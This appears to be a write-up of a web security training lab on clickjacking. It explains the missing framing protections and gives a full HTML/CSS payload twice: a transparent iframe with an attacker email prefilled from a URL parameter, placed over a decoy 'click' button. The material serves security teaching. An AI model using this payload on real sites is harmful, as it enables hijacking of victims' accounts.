## Clickjacking with form input data prefilled from URL parameter

This lab extends the basic clickjacking example in Lab: Basic clickjacking with CSRF token protection. The goal of the lab is to change the email address of the user by prepopulating a form using a URL parameter and enticing the user to inadvertently click on an "Update email" button.

To solve the lab, craft some HTML that frames the account page and fools the user into updating their email address by clicking on a "Click me" decoy. The lab is solved when the email address is changed.

You can log in to your own account using the following credentials: wiener:peter

Note :

The victim will be using Chrome so test your exploit on that browser.

## Notes

- /login
- Possibility to leave a comment
- Exploit Server
- No `X-Frame-Options`
- No `CSP frame-ancestors`

## Resume

1. Load the account page inside an iframe
2. Prefill the email parameter with an attacker-controlled value
3. Make the iframe transparent
4. Overlay a fake clickable element
5. Align the bait element with the real `Update email` button
6. Deliver the exploit to the victim

## Solve

The application allows attacker-controlled framing because anti-clickjacking protections are missing.

The response does not contain:

```http
X-Frame-Options
```

and does not define:

```http
Content-Security-Policy: frame-ancestors
```

As a result, the sensitive account page can be embedded inside a hidden iframe:

```html
<iframe src="https://0aa10069048df9d18069b2f20016007c.web-security-academy.net/my-account?email=hacker@labs.com"></iframe>
```

The vulnerable page automatically pre-populates the email field using the query parameter:

```text
?email=hacker@labs.com
```

This means the attacker controls the value that will be submitted when the victim clicks the form button.

The iframe is then made nearly invisible using:

```css
opacity: 0.00001;
```

The exploit positions the iframe above visible content using:

```css
z-index: 2;
```

while the bait content remains below:

```css
z-index: 1;
```

The fake visible element:

```html
<div>click</div>
```

is carefully aligned with the real:

```text
Update email
```

button inside the hidden iframe.

When the victim attempts to click the visible bait text, the browser actually forwards the click to the hidden button inside the iframe.

Exploit payload:

```html
<style>
    iframe {
        position:relative;
        width:700;
        height: 700;
        opacity: 0.00001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:485;
        left:70;
        z-index: 1;
    }
</style>

<div>click</div>

<iframe src="https://0aa10069048df9d18069b2f20016007c.web-security-academy.net/my-account?email=hacker@labs.com"></iframe>
```

Breakdown:

- `position:relative` → correctly positions the iframe
- `opacity:0.00001` → makes the iframe practically invisible
- `z-index:2` → places the iframe above the visible content
- `top:485` and `left:70` → align the fake text with the real button
- `email=hacker@labs.com` → pre-fills the victim email form with attacker-controlled data

The victim only sees:

```text
click
```

but actually clicks:

```text
Update email
```

inside the transparent iframe.

The browser submits the prefilled form and updates the victim account email address to the attacker-controlled value.

```html
<style>
    iframe {
        position:relative;
        width:700;
        height: 700;
        opacity: 0.00001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:485;
        left:70;
        z-index: 1;
    }
</style>

<div>click</div>

<iframe src="https://0aa10069048df9d18069b2f20016007c.web-security-academy.net/my-account?email=hacker@labs.com"></iframe>
```